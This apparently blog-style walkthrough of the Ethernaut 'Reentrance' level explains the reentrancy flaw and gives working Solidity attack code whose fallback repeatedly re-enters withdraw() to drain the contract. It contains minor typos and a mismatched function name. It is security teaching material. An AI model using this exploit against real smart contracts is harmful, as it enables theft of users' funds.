> The goal of this level is for you to steal all the funds from the contract.


Ah, re-entrancy. If you're aware of the details of the DAO hack that happened back in 2016 it's pretty easy to wrap your head around how to win this one.

What's re-entrancy?
> In computing, a computer program or subroutine is called reentrant if it can be interrupted in the middle of its execution and then safely be called again ("re-entered") before its previous invocations complete execution.

The `Reentrance` contract only has one complex function, `withdraw()`, and this is almost certainly what we want to attack to drain the contract. Let's break down it's logic and see if we can find a re-entry point:
* `if(balances[msg.sender] >= _amount)` - the sender must have a balance >= what they're requesting to withdraw.
    * `msg.sender.call{value: _amount}("")`  - send funds to the `msg.sender` contract. Hmm...no function is called...could this trigger a fallback?
* `balances[msg.sender] -= amount` - after everything prior has finished executing, finally update the `msg.sender`'s balance.

Our path forward is clear. We create an contract with a malicious callback that re-enters `Reentrance.withdraw()` before it's ever able to update `balances`.

## Solution
1. Create a barebones version of the `Reentrance` contract in Remix. Also, create a `Reenter` contract which instantiates an instance of `Reentrace`.
```javascript
contract Reentrance {
  function donate(address _to) public payable {}
  function balanceOf(address _who) public view returns (uint balance) {}
  function withdraw(uint _amount) public {}
  receive() external payable {}
}

contract Reenter {
    // amount we'll donate/withdraw every time
    uint public amount = 1 ether;

    address ethernautAddress = <YOUR INSTANCE ADDRESS>;
    Reentrance public re = Reentrance(payable(ethernautAddress));
    ...
}
```
2. Add a function to donate to your balance on the Ethernaut contract.
```javascript
function selfDonate() public {
    re.donate{value: amount}(address(this));
}
```
3. Add our attacking functions
```javascript
// this will trigger our re-entrancy logic
// once called, the ethernaut contract will
// hit our receive fallback
function beginTheAssult() public {
    re.withdraw(amount);
}

receive() external payable {
    // if it's not empty, keep withdrawing
    if (address(ethernautAddress).balance >= amount) {
        re.withdraw(amount);
    }
}
```
4. Do the following steps
* deploy your contract
* `selfDonate()` funds
* `beginTheAssault()` to trigger our draining